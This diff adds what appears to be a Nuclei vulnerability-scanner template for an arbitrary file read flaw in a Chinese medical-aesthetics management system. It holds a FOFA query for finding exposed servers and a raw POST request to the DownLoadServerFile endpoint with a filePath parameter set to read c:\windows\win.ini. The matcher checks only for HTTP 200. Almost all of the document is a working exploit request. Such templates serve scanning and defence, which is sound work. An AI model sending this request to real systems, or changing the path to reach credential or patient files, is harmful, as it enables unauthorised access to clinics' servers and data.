@@ -1,0 +1,42 @@
+id: poc-ydzdedyforud6se3
+info:
+  name: 宏脉医美行业管理系统DownLoadServerFile存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ydzdedyforud6se3'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ydzdedyforud6se3
+    fofa: title="宏脉医美行业管理系统"
+http:
+- raw:
+  - 'POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=1
+
+    If-Modified-Since: Mon, 27 Nov 2023 08:59:33 GMT
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    If-None-Match: "5378f991021da1:0"
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    filePath=c:\\windows\win.ini'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
